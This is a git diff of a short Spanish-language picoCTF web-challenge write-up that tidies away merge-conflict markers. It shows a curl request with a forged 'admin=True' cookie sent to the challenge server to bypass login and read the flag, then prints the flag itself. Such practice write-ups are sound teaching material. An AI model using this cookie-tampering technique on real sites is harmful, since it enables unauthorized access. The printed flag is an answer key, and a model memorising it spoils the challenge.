@@ -3,7 +3,6 @@ The factory is hiding things from all of its users.
 
 Can you login as Joe and find what they've been looking at? [http://fickle-tempest.picoctf.net:61997](http://fickle-tempest.picoctf.net:61997/)
 ## Solución
-<<<<<<< HEAD
 ```
 FireBoss478-academy@webshell:~$ curl http://fickle-tempest.picoctf.net:59618/flag -H "Cookie: password=hola; username=hola; admin=True" | grep pico
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -13,7 +12,5 @@ FireBoss478-academy@webshell:~$ curl http://fickle-tempest.picoctf.net:59618/fla
 ```
 Solución:
 picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
-=======
->>>>>>> aa59f67 (cambios)
 ## Notas adicionales
 ## Referencias
